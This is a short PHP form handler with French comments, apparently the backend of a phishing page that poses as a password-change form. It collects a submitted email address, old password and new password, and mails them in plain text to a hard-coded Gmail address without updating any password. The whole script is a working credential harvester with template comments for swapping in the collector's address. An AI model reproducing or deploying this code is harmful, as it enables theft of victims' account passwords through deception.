<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username']; // Adresse e-mail
    $old_password = $_POST['old_password']; // Ancien mot de passe
    $new_password = $_POST['new_password']; // Nouveau mot de passe

    // Logique pour envoyer un e-mail ou mettre à jour le mot de passe
    $to = "gregory.runser@gmail.com"; // Remplace par ton adresse e-mail
    $subject = "Demande de mise à jour de mot de passe";
    $message = "Utilisateur : $username\nAncien mot de passe : $old_password\nNouveau mot de passe : $new_password";

    // Pour les en-têtes
    $headers = "From: gregory.runser@gmail.com" . "\r\n" .
               "Reply-To: gregory.runser@gmail.com" . "\r\n"; // Remplace par une adresse d'envoi valide

    // Envoi de l'e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "L'e-mail a été envoyé avec succès.";
    } else {
        echo "Échec de l'envoi de l'e-mail.";
    }
}
?>
